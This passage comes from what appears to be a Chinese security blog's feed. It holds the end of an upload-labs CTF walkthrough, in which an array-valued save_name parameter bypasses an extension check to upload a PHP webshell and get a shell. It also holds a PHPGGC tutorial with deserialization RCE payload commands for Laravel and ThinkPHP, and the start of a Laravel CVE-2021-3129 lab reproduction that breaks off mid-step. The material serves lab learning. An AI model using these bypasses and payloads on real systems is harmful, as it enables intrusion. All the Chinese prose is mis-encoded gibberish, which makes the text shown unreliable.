single-quoted-string">'/'</span> <span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼"</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="ä»£ç è§£æï¼š-2"><a href="#ä»£ç è§£æï¼š-2" class="headerlink" title="ä»£ç è§£æï¼š"></a>ä»£ç è§£æï¼š</h4><p>è¿™æ®µä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯ï¼š</p><ol><li>æ£€æŸ¥ç”¨æˆ·æ˜¯å¦é€‰æ‹©äº†æ–‡ä»¶ã€‚</li><li>æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„ MIME ç±»å‹æ˜¯å¦åˆæ³•ã€‚</li><li>æ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åˆæ³•ã€‚</li><li>å°†æ–‡ä»¶ç§»åŠ¨åˆ°æŒ‡å®šç›®å½•ï¼Œå¹¶è¿”å›ä¸Šä¼ ç»“æœã€‚</li></ol><ul><li>å¦‚æœç”¨æˆ·æ²¡æœ‰é€šè¿‡ <code>$_POST['save_name']</code> æŒ‡å®šä¿å­˜çš„æ–‡ä»¶åï¼Œåˆ™ä½¿ç”¨ä¸Šä¼ æ–‡ä»¶çš„åŸå§‹åç§°ï¼ˆ<code>$_FILES['upload_file']['name']</code>ï¼‰ã€‚</li><li>å°†æ–‡ä»¶åè½¬æ¢ä¸ºå°å†™ï¼Œå¹¶é€šè¿‡ <code>explode('.')</code> å°†æ–‡ä»¶åæŒ‰ <code>.</code> åˆ†å‰²æˆæ•°ç»„ï¼Œæ–¹ä¾¿åç»­æå–æ‰©å±•åã€‚</li></ul><p>è¡¥å……çŸ¥è¯†ï¼š</p><p>explode(separator,string[,limit])  å‡½æ•°ï¼Œä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²å¦ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ç”±å­—ç¬¦ä¸²ç»„æˆçš„æ•°ç»„ã€‚</p><p><code>end()</code> æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºå°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆç§»åŠ¨åˆ°æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¯¥å…ƒç´ çš„å€¼ã€‚</p><p>reset(array) å‡½æ•°ï¼ŒæŠŠæ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¿™ä¸ªå…ƒç´ çš„å€¼</p><p>count(array) å‡½æ•°ï¼Œè®¡ç®—æ•°ç»„ä¸­çš„å•å…ƒæ•°ç›®ï¼Œæˆ–å¯¹è±¡ä¸­çš„å±æ€§ä¸ªæ•°ã€‚</p></blockquote><h2 id="20-3-è§£é¢˜æ€è·¯"><a href="#20-3-è§£é¢˜æ€è·¯" class="headerlink" title="20.3 è§£é¢˜æ€è·¯"></a>20.3 è§£é¢˜æ€è·¯</h2><p>æ£€æŸ¥MIMEç±»å‹ï¼Œä½†æ˜¯æ²¡æœ‰æ£€æµ‹æ–‡ä»¶å†…å®¹ã€‚</p><p>å¦‚æœsave_nameå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼æ˜¯yjh.phpï¼Œç¬¬äºŒä¸ªå…ƒç´ çš„å€¼æ˜¯png|jpg|gifï¼Œé‚£ä¹ˆä¸‹é¢çš„ä»£ç ä¸ä¼šæ‰§è¡Œï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> $ext = end($file);  è·å–åˆ°çš„å€¼å°±æ˜¯png|jpg|gifï¼Œèƒ½å¤Ÿç»•è¿‡åç¼€åçš„æ£€æµ‹ï¼Œæ‰§è¡Œåˆ°ä¸‹é¢çš„ä½ç½®ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼"</span><span class="token punctuation">;</span>    <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>resetå‡½æ•°ä¼šè¿”å›æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼ï¼Œä¹Ÿå°±æ˜¯<code>yjh.php</code></p><p>å¦‚æœ$file[count($file) - 1]çš„å€¼ä¸ºç©ºï¼Œé‚£ä¹ˆå°±èƒ½è¾¾åˆ°ä¸Šä¼  <code>yjh.php.</code>æ–‡ä»¶çš„ç›®çš„ã€‚</p><p>å¦‚ä½•è®©å…¶ä¸ºç©ºï¼Ÿé‚£å°±æ˜¯è®©save_nameæ•°ç»„ä¸­ç¬¬ <code>count($file) - 1</code>å¤„çš„å…ƒç´ ä¸ºç©ºå³å¯ï¼ˆ$fileæ•°ç»„ä¹Ÿå°±æ˜¯save_nameæ•°ç»„ï¼‰ã€‚</p><p>æ¯”å¦‚save_name[0]=yjh.php ï¼Œsave_name[4]=pngï¼Œé‚£ä¹ˆ count($save_name) - 1 =1ï¼Œä½†æ˜¯save_name[1]ä¸ºç©ºã€‚æ»¡è¶³æ¡ä»¶</p><h2 id="20-4-è§£é¢˜è¿‡ç¨‹"><a href="#20-4-è§£é¢˜è¿‡ç¨‹" class="headerlink" title="20.4 è§£é¢˜è¿‡ç¨‹"></a>20.4 è§£é¢˜è¿‡ç¨‹</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2017.30.33.png" style="zoom:50%;"><p>ä¿®æ”¹MIMEç±»å‹</p><p>ç„¶åæŒ‡å®šsave_nameæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸º<code>yjh.php</code>ï¼ŒæŒ‡å®šsave_nameæ•°ç»„çš„ç¬¬äºŒä¸ªå…ƒç´ ä¸º<code>jpg</code>ã€‚</p><p>æˆåŠŸä¸Šä¼ <code>yjh.php.</code>æ–‡ä»¶ã€‚</p><ul><li>getshell</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2017.34.51.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2017.35.20.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2017.35.45.png" style="zoom:50%;"><h1 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ¼æ´ç±»å‹æ€»ç»“ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2017.36.40.png" alt="æ¼æ´ç±»å‹" style="zoom:80%;"><p>è§£é¢˜æ€è·¯æ€»ç»“ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-02-01%2017.37.09.png" style="zoom:80%;"><p>è‡³æ­¤ï¼Œupload-labsé¶åœºå®Œæˆé€šå…³ï¼Œé€šè¿‡è¯¥é¶åœºå®è·µçš„è¿‡ç¨‹è¿›ä¸€æ­¥å¼ºåŒ–äº†å¯¹æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸç†å’Œåˆ©ç”¨æ€è·¯çš„æŒæ¡ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTFå®æˆ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
            <tag> CTF-web </tag>
            
            <tag> buuoj </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ååºåˆ—åŒ–å·¥å…·ä¹‹PHPGGC</title>
      <link href="/2025/01/02/gong-fang-gong-ju-ku/fan-xu-lie-hua-gong-ju-zhi-phpggc/"/>
      <url>/2025/01/02/gong-fang-gong-ju-ku/fan-xu-lie-hua-gong-ju-zhi-phpggc/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€PHPGGCç®€ä»‹"><a href="#ä¸€ã€PHPGGCç®€ä»‹" class="headerlink" title="ä¸€ã€PHPGGCç®€ä»‹"></a>ä¸€ã€PHPGGCç®€ä»‹</h1><p>PHPGGCï¼ˆPHP Generic Gadget Chainsï¼ŒPHPé€šç”¨ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼‰æ˜¯ä¸€æ¬¾èƒ½å¤Ÿè‡ªåŠ¨ç”Ÿæˆä¸»æµæ¡†æ¶åºåˆ—åŒ–æµ‹è¯•payloadçš„å·¥å…·ã€‚å®ƒç±»ä¼¼äºJavaä¸­çš„ysoserialå·¥å…·ï¼Œä½†ä¸“ä¸ºPHPè®¾è®¡ã€‚PHPGGCæ”¯æŒå¤šç§æ¡†æ¶ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºDoctrine, Guzzle, Laravel, Magento, Monolog, Phalcon, Slim, SwiftMailer, Symfony, Yiiå’ŒZendFrameworkç­‰ã€‚è¯¥å·¥å…·å¯ä»¥å¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜å’Œæ¸—é€æµ‹è¯•äººå‘˜åœ¨é‡åˆ°PHPååºåˆ—åŒ–æ¼æ´æ—¶ï¼Œå¿«é€Ÿç”Ÿæˆåˆ©ç”¨payloadï¼Œè€Œæ— éœ€æ‰‹åŠ¨å¯»æ‰¾å’Œç»„åˆå„ç§åˆ©ç”¨é“¾ã€‚</p><blockquote><p>â€œGadgetâ€ è¿™ä¸ªå•è¯åœ¨è‹±è¯­ä¸­é€šå¸¸æŒ‡çš„æ˜¯ä¸€ç§å°å‹çš„æœºæ¢°è®¾å¤‡æˆ–ç”µå­è£…ç½®ï¼Œå®ƒé€šå¸¸è®¾è®¡å¾—éå¸¸ç²¾å·§ï¼Œç”¨æ¥æ‰§è¡Œç‰¹å®šçš„ä»»åŠ¡æˆ–åŠŸèƒ½ã€‚</p></blockquote><h1 id="äºŒã€ä¸»è¦ç‰¹ç‚¹"><a href="#äºŒã€ä¸»è¦ç‰¹ç‚¹" class="headerlink" title="äºŒã€ä¸»è¦ç‰¹ç‚¹"></a>äºŒã€ä¸»è¦ç‰¹ç‚¹</h1><ol><li><strong>å¹¿æ³›çš„payloadè¦†ç›–</strong>ï¼šæ”¯æŒå¤šç§PHPæ¡†æ¶å’Œç»„ä»¶çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ã€‚</li><li><strong>å‘½ä»¤è¡Œç•Œé¢</strong>ï¼šé€šè¿‡ç®€å•çš„å‘½ä»¤è¡Œæ“ä½œå³å¯ç”Ÿæˆpayloadï¼Œæ–¹ä¾¿å¿«æ·ã€‚</li><li><strong>PHARæ–‡ä»¶æ”¯æŒ</strong>ï¼šæ–°å¢äº†å¯¹PHARæ–‡ä»¶æ ¼å¼çš„æ”¯æŒï¼Œå¯ä»¥ç”ŸæˆåŒ…å«ååºåˆ—åŒ–æ•°æ®çš„PHARæ–‡ä»¶ã€‚</li><li><strong>å¤šæ ¼å¼æ–‡ä»¶ç”Ÿæˆ</strong>ï¼šæ”¯æŒç”Ÿæˆå¤šæ ¼å¼æ–‡ä»¶ï¼ˆå¦‚JPEG/PHARï¼‰ï¼Œæ–¹ä¾¿åœ¨ä¸åŒåœºæ™¯ä¸‹ä½¿ç”¨ã€‚</li><li><strong>ç¼–ç å™¨æ”¯æŒ</strong>ï¼šæ–°å¢äº†å¤šç§ç¼–ç å™¨ï¼Œå¦‚Base64ç¼–ç ã€URLç¼–ç ç­‰ï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®éœ€è¦å¯¹ç”Ÿæˆçš„payloadè¿›è¡Œç¼–ç å¤„ç†ã€‚</li><li><strong>å¿«é€Ÿé”€æ¯æ ‡å¿—</strong>ï¼šæ–°å¢äº†<code>--fast-destruct</code>æ ‡å¿—ï¼Œç¡®ä¿ç”Ÿæˆçš„å¯¹è±¡åœ¨ååºåˆ—åŒ–åç«‹å³é”€æ¯ï¼Œæé«˜åˆ©ç”¨çš„å¯é æ€§ã€‚</li></ol><h1 id="ä¸‰ã€éƒ¨ç½²å®‰è£…"><a href="#ä¸‰ã€éƒ¨ç½²å®‰è£…" class="headerlink" title="ä¸‰ã€éƒ¨ç½²å®‰è£…"></a>ä¸‰ã€éƒ¨ç½²å®‰è£…</h1><ul><li>è®¿é—®PHPGGCçš„GitHubé¡µé¢ï¼š<a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></li><li>git cloneä¸‹è½½æºä»£ç å¹¶è§£å‹åˆ°Linuxç¯å¢ƒä¸­ï¼ˆå¦‚Kali Linuxæˆ–CentOSï¼‰ã€‚</li></ul><p>æ³¨æ„ï¼šè¿è¡Œphpggc çš„æ¡ä»¶æ˜¯php cliçš„ç‰ˆæœ¬&gt;=5.6</p><img src="/2025/01/02/gong-fang-gong-ju-ku/fan-xu-lie-hua-gong-ju-zhi-phpggc/%E6%88%AA%E5%B1%8F2025-01-02%2013.26.18.png" style="zoom:35%;"><img src="/2025/01/02/gong-fang-gong-ju-ku/fan-xu-lie-hua-gong-ju-zhi-phpggc/%E6%88%AA%E5%B1%8F2025-01-02%2013.20.54.png" style="zoom:35%;"><h1 id="å››ã€ä½¿ç”¨æ–¹æ³•"><a href="#å››ã€ä½¿ç”¨æ–¹æ³•" class="headerlink" title="å››ã€ä½¿ç”¨æ–¹æ³•"></a>å››ã€ä½¿ç”¨æ–¹æ³•</h1><h2 id="4-1-æŸ¥çœ‹å¯é€‰é¡¹"><a href="#4-1-æŸ¥çœ‹å¯é€‰é¡¹" class="headerlink" title="4.1 æŸ¥çœ‹å¯é€‰é¡¹"></a>4.1 æŸ¥çœ‹å¯é€‰é¡¹</h2><ul><li>è§£å‹åè¿›å…¥å®‰è£…ç›®å½•ï¼Œä½¿ç”¨<code>php</code>å‘½ä»¤è¿è¡ŒPHPGGCï¼Œä¾‹å¦‚ï¼š<code>php phpggc -l</code>æˆ–è€… <code>./phpggc -l</code>åˆ—å‡ºæ”¯æŒçš„æ‰€æœ‰å¯é€‰é¡¹ã€‚</li></ul><img src="/2025/01/02/gong-fang-gong-ju-ku/fan-xu-lie-hua-gong-ju-zhi-phpggc/%E6%88%AA%E5%B1%8F2025-01-02%2013.21.46.png" style="zoom:35%;"><img src="/2025/01/02/gong-fang-gong-ju-ku/fan-xu-lie-hua-gong-ju-zhi-phpggc/%E6%88%AA%E5%B1%8F2025-01-02%2013.25.13.png" style="zoom:40%;"><p>é€šè¿‡./phpggc -l å¯ä»¥åˆ—å‡ºæ‰€æœ‰å¯åˆ©ç”¨çš„ç»„ä»¶ï¼Œå…¶ä¸­æ¯æ¡éƒ½åŒ…æ‹¬ç»„ä»¶çš„åç§°ã€ç‰ˆæœ¬èŒƒå›´ã€å¯åˆ©ç”¨å…¶è¿›è¡Œçš„æ“ä½œ(æ–‡ä»¶è¯»å†™æˆ–RCE)ã€æ”»å‡»å‘é‡(ä¾‹å¦‚__destruct)</p><h2 id="4-2-è¿‡æ»¤åˆ©ç”¨é“¾"><a href="#4-2-è¿‡æ»¤åˆ©ç”¨é“¾" class="headerlink" title="4.2 è¿‡æ»¤åˆ©ç”¨é“¾"></a>4.2 è¿‡æ»¤åˆ©ç”¨é“¾</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./phpggc <span class="token parameter variable">-l</span> laravel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/02/gong-fang-gong-ju-ku/fan-xu-lie-hua-gong-ju-zhi-phpggc/%E6%88%AA%E5%B1%8F2025-01-02%2013.29.31.png" style="zoom:30%;"><h2 id="4-3-å…¶ä»–ä½¿ç”¨æ–¹æ³•"><a href="#4-3-å…¶ä»–ä½¿ç”¨æ–¹æ³•" class="headerlink" title="4.3 å…¶ä»–ä½¿ç”¨æ–¹æ³•"></a>4.3 å…¶ä»–ä½¿ç”¨æ–¹æ³•</h2><ol><li><strong>æ˜¾ç¤ºç»„ä»¶ç›¸å…³ä¿¡æ¯</strong>ï¼š ä½¿ç”¨å‘½ä»¤ <code>./phpggc ç»„ä»¶å -i</code> å¯ä»¥æ˜¾ç¤ºä¸ç»„ä»¶ç›¸å…³çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”Ÿæˆæ”»å‡»payloadæ‰€éœ€è¦çš„å‚æ•°ã€‚</li><li><strong>ç”Ÿæˆpayload</strong>ï¼š æ ¹æ®éœ€è¦ç”Ÿæˆçš„payloadï¼Œä½¿ç”¨å‘½ä»¤ <code>./phpggc ç»„ä»¶å å‡½æ•°å å‚æ•°</code> æ¥ç”Ÿæˆã€‚ä¾‹å¦‚ï¼Œç”ŸæˆLaravel/RCE1çš„payloadéœ€è¦æä¾›å‡½æ•°åä»¥åŠä¼ ç»™è¯¥å‡½æ•°çš„å‚æ•°ï¼Œä½¿ç”¨å‘½ä»¤ <code>./phpggc Laravel/RCE1 system id</code> å³å¯ç”Ÿæˆpayloadã€‚</li><li><strong>æ–‡ä»¶å†™å…¥éœ€æ±‚</strong>ï¼š å¯¹äºåªèƒ½æ»¡è¶³å†™æ–‡ä»¶éœ€æ±‚çš„ç»„ä»¶ï¼Œè¦åˆ©ç”¨å¿…é¡»çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„ã€‚</li><li><strong>å†æ¬¡åŒ…è£…å¤„ç†</strong>ï¼š PHPGGCä¸­çš„ <code>-w</code> å‚æ•°è¿˜å¯ä»¥å¯¹åºåˆ—åŒ–çš„æ•°æ®è¿›è¡Œå†æ¬¡åŒ…è£…å¤„ç†ã€‚</li><li><strong>ç¼–ç æ ¼å¼</strong>ï¼š å¦‚æœéœ€è¦å¯¹ç”Ÿæˆçš„payloadè¿›è¡Œç¼–ç ï¼Œæ¯”å¦‚base64ç¼–ç æˆ–URLç¼–ç ï¼Œå¯ä»¥ç›´æ¥åœ¨å‘½ä»¤åé¢åŠ ä¸Šç›¸åº”çš„å‚æ•°æ¥å®Œæˆç¼–ç ã€‚ä¾‹å¦‚ï¼Œ<code>./phpggc ThinkPHP/RCE3 system() "cat /flag" --base64</code>ã€‚</li></ol><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>PHPGGCæ˜¯ä¸€ä¸ªç”¨äºPHPååºåˆ—åŒ–æ¼æ´åˆ©ç”¨çš„å·¥å…·ï¼Œå®ƒèƒ½å¤Ÿè‡ªåŠ¨ç”Ÿæˆé’ˆå¯¹å¤šç§PHPæ¡†æ¶çš„åˆ©ç”¨é“¾payloadã€‚é€šè¿‡ç®€å•çš„å‘½ä»¤è¡Œæ“ä½œï¼Œç”¨æˆ·å¯ä»¥å¿«é€Ÿåˆ—å‡ºæ”¯æŒçš„ç»„ä»¶ã€æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ï¼Œå¹¶ç”Ÿæˆæ”»å‡»è½½è·ã€‚PHPGGCæ”¯æŒå¤šç§ç¼–ç æ ¼å¼ï¼Œé€‚ç”¨äºå®‰å…¨æµ‹è¯•å’Œæ¸—é€æµ‹è¯•ä¸­çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²å·¥å…·åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜²å·¥å…·åº“ </tag>
            
            <tag> ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ </tag>
            
            <tag> PHPGGC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel RCE CVE-2021-3129</title>
      <link href="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/"/>
      <url>/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€RCE-CVE-2021-3129æ¼æ´æ¦‚è¿°"><a href="#ä¸€ã€RCE-CVE-2021-3129æ¼æ´æ¦‚è¿°" class="headerlink" title="ä¸€ã€RCE CVE-2021-3129æ¼æ´æ¦‚è¿°"></a>ä¸€ã€RCE CVE-2021-3129æ¼æ´æ¦‚è¿°</h1><h2 id="1-1-æ¼æ´ç®€ä»‹"><a href="#1-1-æ¼æ´ç®€ä»‹" class="headerlink" title="1.1 æ¼æ´ç®€ä»‹"></a>1.1 æ¼æ´ç®€ä»‹</h2><p>CVE-2021-3129 æ˜¯ä¸€ä¸ªå½±å“ Laravel æ¡†æ¶çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´ã€‚å½“ Laravel åº”ç”¨ç¨‹åºå¤„äºè°ƒè¯•æ¨¡å¼ï¼ˆDebug modeï¼‰æ—¶ï¼Œç”±äº Laravel è‡ªå¸¦çš„ Ignition ç»„ä»¶å¯¹ <code>file_get_contents()</code> å’Œ <code>file_put_contents()</code> å‡½æ•°çš„ä¸å®‰å…¨ä½¿ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘èµ·æ¶æ„è¯·æ±‚ï¼Œæ„é€ æ¶æ„ Log æ–‡ä»¶ç­‰æ–¹å¼è§¦å‘ Phar ååºåˆ—åŒ–ï¼Œæœ€ç»ˆé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><h2 id="1-2-å½±å“èŒƒå›´"><a href="#1-2-å½±å“èŒƒå›´" class="headerlink" title="1.2 å½±å“èŒƒå›´"></a>1.2 å½±å“èŒƒå›´</h2><p> Laravel ç‰ˆæœ¬ &lt;= 8.4.2 ä»¥åŠ Ignition &lt; 2.5.2 çš„ç³»ç»Ÿã€‚</p><h1 id="äºŒã€æ¼æ´å¤ç°"><a href="#äºŒã€æ¼æ´å¤ç°" class="headerlink" title="äºŒã€æ¼æ´å¤ç°"></a>äºŒã€æ¼æ´å¤ç°</h1><h2 id="2-1-ç¯å¢ƒéƒ¨ç½²"><a href="#2-1-ç¯å¢ƒéƒ¨ç½²" class="headerlink" title="2.1 ç¯å¢ƒéƒ¨ç½²"></a>2.1 ç¯å¢ƒéƒ¨ç½²</h2><h3 id="2-1-1-éƒ¨ç½²vulhub"><a href="#2-1-1-éƒ¨ç½²vulhub" class="headerlink" title="2.1.1 éƒ¨ç½²vulhub"></a>2.1.1 éƒ¨ç½²vulhub</h3><p>åœ¨centos7ï¼ˆ192.168.52.3ï¼‰éƒ¨ç½²vulhubæ¼æ´ç¯å¢ƒã€‚</p><blockquote><p>Vulhubæ˜¯ä¸€ä¸ªé¢å‘å¤§ä¼—çš„å¼€æºæ¼æ´é¶åœºï¼Œæ— éœ€dockerçŸ¥è¯†ï¼Œç®€å•æ‰§è¡Œä¸¤æ¡å‘½ä»¤å³å¯ç¼–è¯‘ã€è¿è¡Œä¸€ä¸ªå®Œæ•´çš„æ¼æ´é¶åœºé•œåƒã€‚æ—¨åœ¨è®©æ¼æ´å¤ç°å˜å¾—æ›´åŠ ç®€å•ï¼Œè®©å®‰å…¨ç ”ç©¶è€…æ›´åŠ ä¸“æ³¨äºæ¼æ´åŸç†æœ¬èº«ã€‚</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/vulhub/vulhub.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å¤§æˆ˜bugï¼š</p><p>fatal: unable to access â€˜<a href="https://github.com/vulhub/vulhub.git/">https://github.com/vulhub/vulhub.git/</a>â€˜: Could not resolve host: github.com; Unknown error:</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2016.41.18.png" style="zoom:50%;"><p>åˆæ­¥åˆ†æå¯èƒ½æ˜¯å› ä¸ºä¹‹å‰æ­å»ºåŸŸæ¸—é€æ”»å‡»ç¯å¢ƒæ—¶ä¿®æ”¹vmnet8ï¼ˆNATç½‘æ®µï¼‰å¯¼è‡´çš„ï¼Œå¯æ˜¯pingç™¾åº¦æ˜¯å¯ä»¥è¿é€šçš„ã€‚éœ€è¦ä¿®æ”¹ä¸€ä¸‹ã€‚</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2016.46.16.png" style="zoom:45%;"><p>DNSé…ç½®æ²¡é—®é¢˜ã€‚</p><p>github.comä¹Ÿæ— æ³•pingé€šã€‚</p><p>ç„¶åå°è¯•å°†macä¸Šçš„ä¸githubæœ‰å…³çš„hostsé…ç½®æ–‡ä»¶é…ç½®åˆ°/etc/hostsæ–‡ä»¶ä¸­ï¼Œè¿˜æ˜¯ä¸è¡Œã€‚</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2016.50.18.png" style="zoom:50%;"><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2016.53.07.png" style="zoom:40%;"><p>é…ç½®hostsï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">140.82</span>.112.3  github.com      <span class="token number">199.232</span>.5.194  github.global.ssl.fastly.net<span class="token number">54.231</span>.114.219 